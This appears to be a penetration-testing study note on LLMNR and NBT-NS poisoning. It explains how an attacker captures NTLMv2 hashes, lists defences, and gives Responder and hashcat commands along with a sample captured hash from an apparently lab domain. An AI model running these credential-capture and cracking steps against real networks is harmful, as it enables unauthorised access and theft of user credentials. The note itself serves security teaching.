# LLMNR Poisoning & Responder

## LLMNR & NBT-NS

Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Windows domain services that act as alternative methods for host identification.

* LLMNR is similar to DNS, allowing hosts on the same network to use name resolution for other hosts
* NBT-NS is used to identify systems on a network by their NetBIOS name

## LLMNR Poisoning

* Scenario: a victim machine is trying to connect to some resource on the network using a hostname. They are unable to resolve the IP address of the desired resource.
* As a result, they broadcast an LLMNR request to everyone on the network, requesting the IP address of the hostname.
* An attacker on the network receives the broadcast and responds to it saying, "I know the IP address of that hostname!"
* According to LLMNR, the victim machine has to identify itself to the attacker in order for the attacker to satisfy its request. To identify itself, the victim sends an **NTLMv2 hash** to identify itself to the attacker.
* With the victim's **NTLMv2 hash** in hand, the attacker has two options:
  1. Crack the victim's **NTLMv2 hash** offline
      * Cracking required
  2. Relay the victim's **NTLMv2 hash** to gain access to other machines on the network
      * No cracking required
      * SMB signing must be disabled on the network

## LLMNR Poisoning Defense

* Disable LLMNR & NBT-NS in the network
* Enforce strong password policy

## LLMNR Poisoning with Responder

* Must be on the target network

```bash
responder -I $INTERFACE_TO_LISTEN_AND_RESPOND_ON -rdwv
```

## Crack NTLMv2 Hashes

* Example (paste the whole blob into the hash file):

```bash
PetersJ::THROWBACK:b0dac951f0cf53d4:47CCCA16DED0244B2ADA9A935BCC6AFA:0101000000000000C0653150DE09D20174AA4DE9CAC3DA33000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000000000000002000004B3D6B44D2A3120D60A62BF16DB15214DFFFC9A8A1015D7100D300901CE9C73B0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00310039002E00310031000000000000000000
```

* Cracking

```bash
hashcat -m 5600 $HASHES_FILE $WORDLIST_FILE [-r $RULE_FILE]
```
